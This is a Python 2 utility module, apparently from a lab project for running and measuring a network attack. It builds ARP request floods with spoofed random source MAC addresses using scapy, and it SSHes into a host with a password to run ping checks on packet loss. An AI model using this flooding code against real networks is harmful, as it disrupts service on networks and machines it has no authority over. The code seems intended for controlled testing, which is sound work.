'''This file contain all utility procedures that will be used to execute an attack'''
import random
from scapy.all import srp, Ether, ARP
import sys
import yaml
import pexpect
import Queue as queue

config_data = None

# Reading YAML config file
with open("config.yaml") as fp:
    try:
        config_data = yaml.load(fp)
    except yaml.YAMLError as ye:
        print ye
        print "Unable to get the Config details"
        sys.exit()

BROADCASTMAC = 'ff:ff:ff:ff:ff:ff'
FLOODPACKETCOUNT = int(config_data['flood_packet_count'])
SSH = 'ssh'
PYTHON = 'python'

def getConfig(key):
    '''Procedure to get value associated with key from config data'''
    return config_data[key]

def randomMAC():
    '''Procedure to generate random MAC Address '''
    mac = [0x00, 0xaa, 0xbb,
         random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def ARPGenerator(destIP, srcMAC='random'):
    '''Procedure to generate multiple ARP Packets '''
    print "Thread ARP Generator started"
    try:
        if srcMAC == 'self':
            for _ in range(FLOODPACKETCOUNT):
                ans, unans = srp(Ether(dst=BROADCASTMAC)/ARP(pdst=destIP), timeout=1, inter=0.1)
        else:
            if srcMAC == 'random':
                srcMAC = randomMAC()
            for _ in range(FLOODPACKETCOUNT):
                ans, unans = srp(Ether(dst=BROADCASTMAC, src=srcMAC)/ARP(hwsrc=srcMAC, pdst=destIP), timeout=1, inter=0.1)
    except Exception as e:
        print "Exception occurred: ", e

def getMacFromIp(hostIP):
    """getMacFromIp function takes Host IP Address, returns MAC of the Host"""
    ans, unans = srp(Ether(dst=BROADCASTMAC)/ARP(pdst=hostIP),
              timeout=2)
    result = '00:00:00:00:00:aa'
    for snd, rcv in ans:
        #result = rcv.sprintf(r"%Ether.src%")
        print rcv.sprintf(r"%Ether.src%")
    return result

def getStats(pingResponse):
    """Procedure to get verification statistics"""
    stats = pingResponse.split('---')[-1]
    packetLoss = stats.split(', ')[-2]
    print packetLoss
    if int(packetLoss.split('%')[0]) > 0:
        return "drop"
    else:
        average = stats.split('/')[-3]
        print "Average: ", average
        return average

def verifyPing(hostIP, username, password, scriptPath, verificationHost, flag, q=None):
    """Procedure to ssh to a different host and execute ping script """
    print "ssh going to start...."
    try:
        sshHost = pexpect.spawn(SSH + " " + username + "@" + hostIP)
        sshHost.expect([pexpect.TIMEOUT, 'password: '])
        sshHost.sendline(password)
        sshHost.expect('.*\$')
        sshHost.sendline('ifconfig')
        sshHost.expect('.*\$')
        command = "python " + scriptPath + " " + verificationHost + " " + flag
        sshHost.sendline(command)
        sshHost.expect('.*\$')
        print sshHost.after
        sshHost.close()
        if q == None:
            return getStats(sshHost.after)
        else:
            q.put(getStats(sshHost.after))
    except Exception as e:
        if q == None:
            print "Exception : ", e
            return "drop"
        else:
            print "Exception : ", e
            q.put("drop")

